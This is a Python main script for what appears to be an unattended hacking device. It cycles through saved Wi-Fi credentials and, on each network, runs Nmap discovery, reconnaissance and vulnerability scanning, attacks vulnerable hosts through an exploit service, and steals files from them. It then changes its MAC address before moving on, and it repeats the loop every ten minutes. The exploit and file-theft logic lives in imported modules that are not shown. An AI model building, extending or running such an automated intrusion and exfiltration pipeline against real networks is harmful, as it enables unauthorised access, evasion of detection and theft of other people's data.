#!/usr/bin/env python3

import os
import time
import logging

from utils.logger import Logger
from services.wifi_service import WifiService
from services.nmap_service import NmapService
from services.recon_service import ReconService
from services.vulnerability_service import VulnerabilityService
from services.exploit_service import ExploitService
from services.file_stealer_service import FileStealerService
from services.log_service import LogService
from services.display_service import DisplayService

def main():
    # Prepare logging and directories
    os.makedirs("logs", exist_ok=True)
    logging.basicConfig(level=logging.INFO)
    logger = Logger(log_file="logs/scan.log")

    # 1) Wi-Fi service & manager
    wifi_svc     = WifiService(logger=logger)
    wifi_manager = wifi_svc.manager

    # 2) Other services
    nmap_svc     = NmapService(wifi_manager, logger=logger)
    recon_svc    = ReconService(logger=logger)
    log_svc      = LogService()
    vuln_svc     = VulnerabilityService(logger=logger, html_logger=log_svc.html_logger)
    exploit_svc  = ExploitService(logger=logger, html_logger=log_svc.html_logger)
    thief_svc    = FileStealerService(wifi_service=wifi_svc, logger=logger)

    # 3) Display service — initialize once up front
    display_svc = DisplayService()
    display_svc.initialize()

    # 4) Load Wi-Fi credentials
    wifi_creds = wifi_svc.load_credentials()
    if not wifi_creds:
        logger.log("[ERROR] No Wi-Fi credentials found, exiting.")
        return

    try:
        while True:
            for net in wifi_creds:
                ssid = net.get("SSID")
                pwd  = net.get("Password")
                if not ssid or not pwd:
                    continue

                # Stats reset for this SSID
                stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}

                # --- 1) Connect ---
                display_svc.update(
                    state="scanning",
                    ssid=ssid,
                    status="Connecting to Wi-Fi",
                    stats=stats,
                    partial=True
                )
                if not wifi_svc.connect(ssid, pwd):
                    display_svc.update(
                        state="fallback",
                        ssid=ssid,
                        status="Connection failed, next...",
                        stats=stats,
                        partial=True
                    )
                    continue

                # --- 2) Discovery ---
                display_svc.update(
                    state="analyzing",
                    ssid=ssid,
                    status="Running Nmap scan",
                    stats=stats,
                    partial=True
                )
                scan_res = nmap_svc.discover()
                log_svc.save_scan(ssid, scan_res)
                ips = scan_res.get("discovered_ips", [])
                stats["targets"] = len(ips)

                # --- 3) Reconnaissance ---
                display_svc.update(
                    state="reconnaissance",
                    ssid=ssid,
                    status=f"{stats['targets']} host(s) found",
                    stats=stats,
                    partial=True
                )
                devices = recon_svc.enrich_devices(scan_res["raw_output"], ips)
                log_svc.append_recon(ssid, devices)

                # --- 4) Vulnerability Scan ---
                vuln_list = vuln_svc.scan(devices, ssid)
                stats["vulns"] = sum(len(v["vulnerabilities"]) for v in vuln_list)
                log_svc.append_vulns(ssid, vuln_list)
                display_svc.update(
                    state="investigating",
                    ssid=ssid,
                    status=f"{stats['vulns']} vuln(s) found",
                    stats=stats,
                    partial=True
                )

                # --- 5) Exploit Testing ---
                targets = exploit_svc.test(vuln_list, ssid)
                stats["exploits"] = len(targets)
                display_svc.update(
                    state="attacking",
                    ssid=ssid,
                    status=f"Attacking {stats['exploits']} host(s)",
                    stats=stats,
                    partial=True
                )

                # --- 6) File Stealing ---
                stolen = thief_svc.steal(targets)
                stats["files"] = len(stolen)
                if stats["files"] > 0:
                    display_svc.update(
                        state="file_stolen",
                        ssid=ssid,
                        status=f"Stolen from {stats['files']} host(s)",
                        stats=stats,
                        partial=False
                    )
                else:
                    logger.log("[WARNING] File stealing failed: no files exfiltrated.")
                    display_svc.update(
                        state="attacking",
                        ssid=ssid,
                        status="File stealing failed",
                        stats=stats,
                        partial=False
                    )

                # --- 7) Rotate MAC before next SSID ---
                wifi_svc.disconnect()
                wifi_svc.change_mac(interface=wifi_manager.interface)

            # All networks done — final success screen
            display_svc.update(
                state="success",
                ssid="All Networks",
                status="Workflow Complete",
                stats={"targets": 0, "vulns": 0, "exploits": 0, "files": 0},
                partial=False
            )

            logger.log("[INFO] Cycle complete, sleeping for 10 minutes.")
            time.sleep(600)

    except KeyboardInterrupt:
        logger.log("[INFO] Interrupted by user, exiting.")
    except Exception as e:
        logger.log(f"[ERROR] Fatal error: {e}")
    finally:
        try:
            display_svc.clear()
        except Exception as e:
            logger.log(f"[WARNING] Could not clear display: {e}")
        logger.log("[INFO] Display cleared, shutdown complete.")

if __name__ == "__main__":
    main()
